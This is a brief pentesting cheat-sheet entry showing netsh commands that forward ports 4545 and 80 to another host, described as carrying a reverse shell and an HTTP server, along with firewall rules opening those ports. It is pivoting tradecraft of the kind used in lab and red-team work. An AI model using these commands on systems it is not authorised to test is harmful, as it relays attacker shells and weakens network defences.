# Netsh Port Forwarding

##### Forward the port 4545 for the reverse shell, and the 80 for the http server for example

    netsh interface portproxy add v4tov4 listenport=4545 connectaddress=192.168.50.44 connectport=4545
    netsh interface portproxy add v4tov4 listenport=80 connectaddress=192.168.50.44 connectport=80

##### Correctly open the port on the machine

    netsh advfirewall firewall add rule name="PortForwarding 80" dir=in action=allow protocol=TCP localport=80
    netsh advfirewall firewall add rule name="PortForwarding 80" dir=out action=allow protocol=TCP localport=80
    netsh advfirewall firewall add rule name="PortForwarding 4545" dir=in action=allow protocol=TCP localport=4545
    netsh advfirewall firewall add rule name="PortForwarding 4545" dir=out action=allow protocol=TCP localport=4545
